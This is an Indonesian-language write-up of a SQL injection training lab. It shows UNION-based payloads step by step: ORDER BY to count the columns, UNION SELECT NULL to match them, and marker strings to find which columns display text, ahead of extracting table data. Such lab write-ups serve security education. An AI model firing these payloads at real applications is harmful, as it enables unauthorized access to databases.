# SQL Injection Lab – UNION-based Injection

## Lab Description

![image](https://user-images.githubusercontent.com/67383098/234052779-081854cf-469c-41be-b3fa-df4097769882.png)

---

## Solution

### 1. Query Dasar

Query awal yang digunakan aplikasi adalah:

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

### 2. Menentukan Jumlah Kolom

Dengan menambahkan `ORDER BY 4`, muncul error.
Artinya, query hanya memiliki **3 kolom** yang diretriev dari tabel.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 4 --
```

![image](https://user-images.githubusercontent.com/67383098/234053894-e8d616b7-87bc-4dc0-92b7-fa1af1ea43fe.png)

---

### 3. Menentukan Kolom yang Mendukung Data Teks

Untuk melanjutkan eksploitasi dengan **UNION SELECT**, jumlah kolom harus sama, yaitu 3.
Maka digunakan payload dengan 3 nilai `NULL`:

```sql
... UNION SELECT NULL,NULL,NULL --
```

Selanjutnya, kita uji dengan menyisipkan string unik (`33eWHU`) pada tiap posisi untuk mengetahui kolom mana yang dapat menampilkan data teks.

#### a. Uji String pada Kolom Pertama

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' 
UNION SELECT '33eWHU',NULL,NULL --
```

![image](https://user-images.githubusercontent.com/67383098/234055682-cf669cee-400a-466a-8892-7a64b10ee3a3.png)

#### b. Uji String pada Kolom Kedua

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' 
UNION SELECT NULL,'33eWHU',NULL --
```

![image](https://user-images.githubusercontent.com/67383098/234055016-49ef404e-457f-4e51-b9bf-b72e2b73872a.png)

![image](https://user-images.githubusercontent.com/67383098/234056709-ac749d4f-ac32-4df6-be18-4242a659d782.png)

![image](https://user-images.githubusercontent.com/67383098/234056775-01164b40-3359-4444-bdf8-4beb71aae69a.png)

---

### Kesimpulan

* Terdapat **3 kolom** dalam query.
* Dari uji coba dengan string `33eWHU`, kolom tertentu dapat menampilkan data teks.
* Informasi ini bisa digunakan untuk melanjutkan eksploitasi SQL Injection dengan UNION SELECT, misalnya untuk membaca nama tabel atau data sensitif lainnya.
